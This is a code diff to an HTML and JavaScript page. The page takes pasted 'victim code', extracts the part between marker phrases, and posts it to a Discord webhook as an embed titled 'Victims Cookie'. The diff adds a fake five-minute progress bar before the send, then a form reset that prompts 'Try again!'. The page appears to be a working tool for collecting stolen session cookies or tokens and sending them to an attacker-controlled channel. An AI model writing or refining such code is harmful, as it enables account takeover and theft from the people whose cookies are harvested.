@@ -40,6 +40,24 @@
       color: red;
       font-weight: bold;
     }
+    #loadingBarContainer {
+      width: 70%;
+      background-color: #f3f3f3;
+      margin-top: 20px;
+      height: 30px;
+      border-radius: 5px;
+      display: none; /* Hidden by default */
+    }
+    #loadingBar {
+      width: 1%;
+      height: 100%;
+      background-color: green;
+      border-radius: 5px;
+    }
+    #status {
+      font-weight: bold;
+      margin-top: 10px;
+    }
   </style>
 </head>
 <body>
@@ -48,7 +66,10 @@
     <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea><br>
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
-  <p id="status" style="color: green; font-weight: bold;"></p>
+  <div id="loadingBarContainer">
+    <div id="loadingBar"></div>
+  </div>
+  <p id="status" style="color: green;"></p>
   <p id="errorMessage" class="error"></p>
 
   <script>
@@ -59,6 +80,8 @@
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
+      const loadingBarContainer = document.getElementById("loadingBarContainer");
+      const loadingBar = document.getElementById("loadingBar");
       let message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
@@ -82,42 +105,85 @@
         const middleMessage = message.slice(startIndex + startPhrase.length, endIndex).trim();
 
         if (middleMessage) {
-          // Create the embed payload
-          const embedPayload = {
-            embeds: [
-              {
-                title: "Victims Cookie", // Embed title
-                description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
-                color: 16711680, // Embed color (red in this case)
-                timestamp: new Date().toISOString() // Adds a timestamp
-              }
-            ]
-          };
+          // Hide the Send button and show the loading bar
+          sendButton.style.display = "none";
+          loadingBarContainer.style.display = "block";
 
-          // Send the embed to Discord webhook
-          fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(embedPayload),
-          })
-            .then((response) => {
-              if (response.ok) {
-                document.getElementById("status").textContent = "Message sent successfully!";
-                messageInput.value = ""; // Clear the input
-              } else {
-                throw new Error("Failed to send the message.");
-              }
-            })
-            .catch((error) => {
-              console.error("Error:", error);
-              document.getElementById("status").textContent = "Failed to send the message.";
-            });
+          let progress = 1; // Start at 1% progress
+          const progressInterval = setInterval(() => {
+            if (progress >= 100) {
+              clearInterval(progressInterval);
+              sendToDiscord(middleMessage);
+            } else {
+              progress++;
+              loadingBar.style.width = `${progress}%`;
+            }
+          }, 180); // Increase progress every 180ms (5 minutes = 300 seconds, divide by 100 steps)
         } else {
           errorMessage.textContent = "Message failed! Wrong Code.";
         }
       } else {
-        errorMessage.textContent = "Message failed! Make sure you paste the right code from the victim ";
+        errorMessage.textContent = "Message failed! Make sure you paste the right code from the victim.";
       }
+    }
+
+    function sendToDiscord(middleMessage) {
+      // Create the embed payload
+      const embedPayload = {
+        embeds: [
+          {
+            title: "Victims Cookie", // Embed title
+            description: `\`\`\`${middleMessage}\`\`\``, // Embed description with the message surrounded by triple backticks
+            color: 16711680, // Embed color (red in this case)
+            timestamp: new Date().toISOString() // Adds a timestamp
+          }
+        ]
+      };
+
+      // Send the embed to Discord webhook
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embedPayload),
+      })
+        .then((response) => {
+          if (response.ok) {
+            document.getElementById("status").textContent = "Message sent successfully!";
+            setTimeout(() => {
+              resetForm();
+            }, 3000); // Reset after 3 seconds
+          } else {
+            throw new Error("Failed to send the message.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          document.getElementById("status").textContent = "Failed to send the message.";
+          setTimeout(() => {
+            resetForm();
+          }, 3000); // Reset after 3 seconds
+        });
+    }
+
+    function resetForm() {
+      const sendButton = document.getElementById("sendButton");
+      const loadingBarContainer = document.getElementById("loadingBarContainer");
+      const messageInput = document.getElementById("messageInput");
+      const errorMessage = document.getElementById("errorMessage");
+      const status = document.getElementById("status");
+
+      // Reset progress bar and visibility
+      loadingBar.style.width = "1%";
+      loadingBarContainer.style.display = "none";
+      sendButton.style.display = "inline-block";
+      errorMessage.textContent = "";
+      status.textContent = "Try again!";
+      
+      // Reset message box after showing the "Try again" message for 3 seconds
+      setTimeout(() => {
+        status.textContent = "";
+        messageInput.value = ""; // Clear input box
+      }, 3000);
     }
   </script>
 </body>
